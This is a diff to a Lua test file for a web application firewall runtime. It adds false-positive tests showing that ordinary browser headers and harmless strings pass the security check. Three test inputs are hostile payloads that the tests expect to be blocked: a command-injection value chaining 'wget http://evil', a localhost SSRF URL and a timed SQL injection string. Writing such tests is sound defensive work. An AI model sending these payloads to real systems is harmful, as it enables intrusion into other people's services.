@@ -734,6 +734,77 @@ local function test_security_check_path_and_sql()
     assert_equal(err, nil, "sql execute err")
     assert_equal(decision and decision.kind or "nil", "block", "sql should block")
 
+    -- False-positive guards
+    assert_equal(
+        runtime.debug_security_check({ ssrf = true }),
+        true,
+        "Chrome-like path alone must not trip SSRF"
+    )
+    reset_request("sec-site", nil, "/")
+    ngx.req.get_headers = function()
+        return {
+            ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            Accept = "*/*",
+        }
+    end
+    assert_equal(
+        runtime.debug_security_check({
+            sql_injection = true,
+            command_injection = true,
+            xss = true,
+            ssrf = true,
+            path_traversal = true,
+            file_inclusion = true,
+        }),
+        true,
+        "normal browser headers must pass security_check"
+    )
+    reset_request("sec-site", nil, "/")
+    ngx.req.get_uri_args = function()
+        return { name = "sleep(better)" }
+    end
+    assert_equal(runtime.debug_security_check({ sql_injection = true }), true, "sleep(word) must not trip SQL")
+    reset_request("sec-site", nil, "/")
+    ngx.req.get_uri_args = function()
+        return { theme = "dark||light" }
+    end
+    ngx.req.get_headers = function()
+        return { Cookie = "a=1&&b=2" }
+    end
+    assert_equal(runtime.debug_security_check({ command_injection = true }), true, "bare &&/|| must not trip command")
+    reset_request("sec-site", nil, "/")
+    ngx.req.get_uri_args = function()
+        return { q = "javascript: the good parts" }
+    end
+    assert_equal(runtime.debug_security_check({ xss = true }), true, "prose javascript: must not trip XSS")
+    reset_request("sec-site", nil, "/")
+    ngx.req.get_uri_args = function()
+        return { q = "1;wget http://evil" }
+    end
+    assert_equal(
+        runtime.debug_security_check({ command_injection = true }),
+        false,
+        "command injection payload should still block"
+    )
+    reset_request("sec-site", nil, "/")
+    ngx.req.get_uri_args = function()
+        return { u = "http://127.0.0.1/admin" }
+    end
+    assert_equal(
+        runtime.debug_security_check({ ssrf = true }),
+        false,
+        "URL-shaped localhost SSRF should block"
+    )
+    reset_request("sec-site", nil, "/")
+    ngx.req.get_uri_args = function()
+        return { q = "1' and sleep(5)--" }
+    end
+    assert_equal(
+        runtime.debug_security_check({ sql_injection = true }),
+        false,
+        "timed SQL sleep should block"
+    )
+
     runtime = load_runtime({
         rule_groups = { rule(1, false, security_graph({})) },
         bindings = { binding("sec-site", { 1 }) },
